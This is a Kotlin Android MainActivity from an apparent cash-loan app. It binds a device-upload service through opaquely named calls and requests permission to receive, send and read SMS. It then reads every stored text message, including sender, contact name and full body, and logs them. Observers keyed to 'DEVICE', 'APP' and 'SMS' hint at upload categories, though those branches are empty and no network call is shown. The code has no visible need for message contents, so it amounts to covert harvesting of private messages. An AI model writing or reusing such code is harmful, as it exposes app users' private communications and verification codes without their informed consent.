package com.loan.golden.cash.money.loan.ui.activity

import android.annotation.SuppressLint
import android.content.ComponentName
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.content.ServiceConnection
import android.database.Cursor
import android.net.Uri
import android.os.Bundle
import android.os.IBinder
import androidx.activity.OnBackPressedCallback
import androidx.navigation.Navigation
import com.hjq.permissions.Permission
import com.hjq.permissions.XXPermissions
import com.hjq.toast.ToastUtils
import com.loan.golden.cash.money.loan.R
import com.loan.golden.cash.money.loan.app.base.BaseActivity
import com.loan.golden.cash.money.loan.app.permissions.PermissionInterceptor
import com.loan.golden.cash.money.loan.app.util.RxToast
import com.loan.golden.cash.money.loan.data.DeviceUpLoadService
import com.loan.golden.cash.money.loan.databinding.ActivityMainBinding
import com.loan.golden.cash.money.loan.ui.viewmodel.MainViewModel
import me.hgj.mvvmhelper.util.LogUtils

/**
 * created by : huxiaowei
 * @date : 20220920
 * Describe :
 */
class MainActivity : BaseActivity<MainViewModel, ActivityMainBinding>() {

    var exitTime = 0L
    lateinit var myBinder: DeviceUpLoadService.mBinder

    private val connection = object : ServiceConnection {
        override fun onServiceConnected(p0: ComponentName?, p1: IBinder?) {
            myBinder = p1 as DeviceUpLoadService.mBinder
            myBinder.a()
            mViewModel.nappyNapraPath(this@MainActivity)
        }

        override fun onServiceDisconnected(p0: ComponentName?) {

        }
    }

    override fun initView(savedInstanceState: Bundle?) {

        val intent = Intent(this, DeviceUpLoadService::class.java)
        bindService(intent, connection, Context.BIND_AUTO_CREATE)//绑定Service

        onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
                val nav = Navigation.findNavController(this@MainActivity, R.id.host_fragment)
                if (nav.currentDestination != null && nav.currentDestination!!.id != R.id.main_fragment) {
                    //如果当前界面不是主页，那么直接调用返回即可
                    nav.navigateUp()
                } else {
                    //是主页
                    if (System.currentTimeMillis() - exitTime > 2000) {
                        ToastUtils.show("再按一次退出程序")
                        exitTime = System.currentTimeMillis()
                    } else {
                        finish()
                    }
                }
            }
        })
        requestSmsPermission()
    }

    private fun requestSmsPermission() {
        XXPermissions.with(this)
            .permission(Permission.RECEIVE_SMS)
            .permission(Permission.SEND_SMS)
            .permission(Permission.READ_SMS)
            .interceptor(PermissionInterceptor())
            .request { _, allGranted ->
                if (allGranted) {
                    getSMSInfo()
                } else {
                    RxToast.showToast("Insufficient permissions. Please manually enable permissions and try again")
                }
            }
    }

    @SuppressLint("Range")
    private fun getSMSInfo() {
        val smsInfo: Uri = Uri.parse("content://sms/")
        val cr: ContentResolver = this.contentResolver
        val projection = arrayOf("_id", "address", "person", "body", "date", "type")
        val cur: Cursor? = cr.query(smsInfo, projection, null, null, "date desc")
        if (null == cur) {
            LogUtils.debugInfo("ooc", "************cur == null")
            return
        }
        while (cur.moveToNext()) {
            val number: String = cur.getString(cur.getColumnIndex("address")) //手机号
            val name: String = cur.getString(cur.getColumnIndex("person")) //联系人姓名列表
            val body: String = cur.getString(cur.getColumnIndex("body")) //短信内容
            //至此就获得了短信的相关的内容, 以下是把短信加入map中，构建listview,非必要。
            val map: HashMap<String, Any> = HashMap()
            map["num"] = number
            map["mess"] = body
            map["name"] = name
            //list.add(map)
            LogUtils.debugInfo("输出mapmapnumber:$number+$name:$+body:$body")
        }
    }

    override fun onRequestSuccess() {
        super.onRequestSuccess()
        mViewModel.nappyResult.observe(this) {
            if (it.list.isNotEmpty()) {
                it.list.forEachIndexed { _, s ->
                    when (s) {
                        "DEVICE" -> {

                        }

                        "APP" -> {

                        }

                        "SMS" -> {

                        }
                    }
                }
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        unbindService(connection)//解绑Service
    }
}